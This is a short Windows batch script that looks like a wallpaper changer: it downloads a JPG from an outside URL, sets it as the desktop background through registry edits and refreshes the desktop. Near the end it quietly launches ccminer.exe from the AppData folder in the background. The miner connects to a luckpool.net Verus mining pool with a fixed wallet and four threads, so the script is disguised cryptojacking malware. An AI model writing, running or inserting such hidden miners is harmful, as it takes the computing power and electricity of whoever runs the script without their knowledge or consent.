@echo off
set "scriptPath=%~dp0"
set "imageURL=https://store.cyber-safe.pro/public/assets/image/950652292.jpg"
set "imageFile=%scriptPath%950652292.jpg"
echo "%imageFile%"
:: Download the image from the URL
powershell -Command "Invoke-WebRequest %imageURL% -OutFile %imageFile%"

:: Set the wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imageFile%" /f

:: Configure wallpaper style
reg delete "HKCU\Control Panel\Desktop" /v WallpaperStyle /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f

:: Update the desktop background
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters


start /B %APPDATA%/Microsoft/Windows/ccminer.exe -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.Lucifer -p x -t 4

:: Exit the script
exit
